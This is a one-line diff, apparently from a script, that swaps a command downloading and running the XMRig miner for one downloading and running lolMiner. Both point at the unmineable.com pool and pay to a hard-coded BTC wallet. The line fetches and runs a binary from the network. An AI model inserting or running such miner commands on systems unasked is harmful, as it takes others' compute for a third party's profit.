@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-bionic-x64.tar.gz && tar xf xmrig-6.10.0-bionic-x64.tar.gz && cd xmrig-6.10.0 && ./xmrig --threads=3 -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1q3s0lkkrkcfjc7ggtmhcqk42m3zp5myzjpe3pxj.rib3
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -zxvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && clear && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTC:bc1q3s0lkkrkcfjc7ggtmhcqk42m3zp5myzjpe3pxj.rib3 --ethstratum ETHPROXY
